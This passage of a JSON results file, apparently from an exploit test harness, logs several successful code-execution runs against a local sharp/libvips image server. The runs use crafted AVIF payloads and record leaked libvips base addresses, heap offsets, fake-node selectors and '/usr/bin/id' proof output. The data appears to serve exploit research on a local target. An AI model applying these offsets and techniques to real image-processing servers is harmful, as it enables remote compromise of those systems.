+                          "0x10178"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f9337e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f9338029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xe8c90",
+                          "0xe8c98"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f9338029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x823c0",
+                          "0x823c8",
+                          "0x823d0",
+                          "0x823d8",
+                          "0x823e0",
+                          "0x823e8",
+                          "0x823f0",
+                          "0x823f8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f934f865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f934fa231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83590"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f934fa28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83b08",
+                          "0x83ba0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f9337e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f93380151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x11ba8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f933801a130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xb200"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 2
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-758e75dd6197423dbf72442b7a316569.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 5,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7fd25ec00000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fd25ec00000",
+            "response_sha256": "a4e53a91fee6ab77fd1dfa417e3515fadeb241417e69a754037b7ee04caf4ab2",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xe99c8",
+                "arena_base": "0x7fd254000000",
+                "arena_sentinel": "0x7fd254000098",
+                "related_pointer": "0x7fd25455fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7fd2544f6e30",
+                "anchor_page": "0x7fd2544f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7fd2544f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7fd25ef3cd0f",
+                  "0x7fd25ef3de99",
+                  "0x7fd25edb8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7fd2544f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xef588",
+                "arena_base": "0x7fd254000000",
+                "arena_sentinel": "0x7fd254000098",
+                "related_pointer": "0x7fd25455fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7fd2544fc9f0",
+                "anchor_page": "0x7fd2544fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7fd2544fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7fd25ef3cd0f",
+                  "0x7fd25ef3de99",
+                  "0x7fd25edb8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7fd2544fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 2,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 2,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fd25ec00000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fd25edbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x4500"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fd25edc3120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x44f8",
+              "0x62a8",
+              "0x7328",
+              "0x16358"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fd25edc3130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x4508",
+              "0x62b8",
+              "0x7338",
+              "0x16368"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fd25ec00000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7fd25edbe1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x4500"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7fd25edc3120",
+                "repetitions": 4,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x44f8",
+                  "0x62a8",
+                  "0x7328",
+                  "0x16358"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7fd25edc3130",
+                "repetitions": 4,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x4508",
+                  "0x62b8",
+                  "0x7338",
+                  "0x16368"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 6035,
+                "distinct_pointer_qwords": 2285,
+                "supported_bases": [
+                  {
+                    "base": "0x7fd25ec00000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7fd25edbe1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4500"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7fd25edc3120",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x44f8",
+                          "0x62a8",
+                          "0x7328",
+                          "0x16358"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7fd25edc3130",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4508",
+                          "0x62b8",
+                          "0x7338",
+                          "0x16368"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7fd253e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7fd254029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xdfe50",
+                          "0xdfe58"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7fd254029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x79580",
+                          "0x79588",
+                          "0x79590",
+                          "0x79598",
+                          "0x795a0",
+                          "0x795a8",
+                          "0x795b0",
+                          "0x795b8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7fd25f865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7fd25fa231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7a750"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7fd25fa28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7acc8",
+                          "0x7ad60"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7fd253e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7fd2540151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x8d68"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7fd25401a130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x23c0"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 2
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-db8fc340cde5413698f4c157fb56c1b6.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 6,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f2772400000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f2772400000",
+            "response_sha256": "520e6d5b4b289da1df0462b1f8fd14c6136633ca61d5ec8f4a0c9e30de8dd9db",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xebd28",
+                "arena_base": "0x7f2754000000",
+                "arena_sentinel": "0x7f2754000098",
+                "related_pointer": "0x7f275455fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7f27544f6e30",
+                "anchor_page": "0x7f27544f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f27544f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f277273cd0f",
+                  "0x7f277273de99",
+                  "0x7f27725b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f27544f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xf18e8",
+                "arena_base": "0x7f2754000000",
+                "arena_sentinel": "0x7f2754000098",
+                "related_pointer": "0x7f275455fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7f27544fc9f0",
+                "anchor_page": "0x7f27544fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f27544fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f277273cd0f",
+                  "0x7f277273de99",
+                  "0x7f27725b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f27544fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 3,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 3,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f2772400000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f27725be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6860"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f27725c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6858",
+              "0x8608",
+              "0x9688"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f27725c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6868",
+              "0x8618",
+              "0x9698"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 2
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f2772400000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f27725be1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x6860"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f27725c3120",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x6858",
+                  "0x8608",
+                  "0x9688"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f27725c3130",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x6868",
+                  "0x8618",
+                  "0x9698"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5904,
+                "distinct_pointer_qwords": 2085,
+                "supported_bases": [
+                  {
+                    "base": "0x7f2772400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f27725be1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6860"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f27725c3120",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6858",
+                          "0x8608",
+                          "0x9688"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f27725c3130",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6868",
+                          "0x8618",
+                          "0x9698"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f2753e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f2754029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xe21b0",
+                          "0xe21b8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f2754029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7b8e0",
+                          "0x7b8e8",
+                          "0x7b8f0",
+                          "0x7b8f8",
+                          "0x7b900",
+                          "0x7b908",
+                          "0x7b910",
+                          "0x7b918"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f2773065000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f27732231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7cab0"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f2773228120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7d028",
+                          "0x7d0c0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f2753e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f27540151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xb0c8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f275401a130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4720"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 3
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-479befbb9e0d4fcf9ef9a0ce0d5a1eee.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 7,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7ffb89c00000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "no_match",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7ffb89c00000",
+            "response_sha256": "ac609b814c17eacba83840dda75928052673ab5fd2f416e81974af45c239114f",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": 0,
+            "matches": [],
+            "candidate_selectors": [],
+            "attempt": 5,
+            "classification_status": "selected"
+          },
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7ffb89c00000",
+            "response_sha256": "91b415ea167549186cbfe87401de8e0bf8dd6d73bdcb178ada957cb4d241e922",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xdc008",
+                "arena_base": "0x7ffb70000000",
+                "arena_sentinel": "0x7ffb70000098",
+                "related_pointer": "0x7ffb7105fd00",
+                "related_pointer_delta": "0x68f50",
+                "anchor": "0x7ffb70ff6db0",
+                "anchor_page": "0x7ffb70ff6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7ffb70ff7270",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7ffb89f3cd0f",
+                  "0x7ffb89f3de99",
+                  "0x7ffb89db8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7ffb70ff5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xe1bc8",
+                "arena_base": "0x7ffb70000000",
+                "arena_sentinel": "0x7ffb70000098",
+                "related_pointer": "0x7ffb7105fd00",
+                "related_pointer_delta": "0x63390",
+                "anchor": "0x7ffb70ffc970",
+                "anchor_page": "0x7ffb70ffc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7ffb70ffce30",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7ffb89f3cd0f",
+                  "0x7ffb89f3de99",
+                  "0x7ffb89db8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7ffb70ffb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 6,
+            "classification_status": "no_match"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7ffb89c00000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7ffb89dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd400"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7ffb89dc3120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x83a8",
+              "0xd3f8",
+              "0xf1a8",
+              "0x10228"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7ffb89dc3130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x83b8",
+              "0xd408",
+              "0xf1b8",
+              "0x10238"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5317,
+                "distinct_pointer_qwords": 1877,
+                "supported_bases": [],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7ffb67e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb68029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd4810",
